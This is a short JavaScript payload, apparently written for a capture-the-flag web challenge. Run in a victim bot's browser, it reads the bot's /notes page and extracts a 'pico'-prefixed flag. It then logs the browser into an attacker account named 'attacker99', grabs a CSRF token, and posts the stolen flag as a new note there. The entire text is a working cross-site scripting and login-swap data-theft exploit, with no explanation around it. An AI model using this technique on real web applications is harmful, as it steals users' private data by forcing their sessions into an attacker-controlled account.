fetch('/notes').then(r=>r.text()).then(botHtml=>{
  let start=botHtml.indexOf('pico');
  let end=botHtml.indexOf('}',start)+1;
  if(start>0 && end>start){
    let flag=botHtml.substring(start,end);
    fetch('/login',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'username=attacker99&password=pass99'
    }).then(()=>fetch('/new')).then(r=>r.text()).then(html=>{
      let csrfMatch=html.match(/name="_csrf" value="([^"]+)"/);
      if(csrfMatch){
        fetch('/new',{
          method:'POST',
          headers:{'Content-Type':'application/x-www-form-urlencoded'},
          body:'_csrf='+csrfMatch[1]+'&title=GOTIT&content='+encodeURIComponent(flag)
        });
      }
    });
  }
});
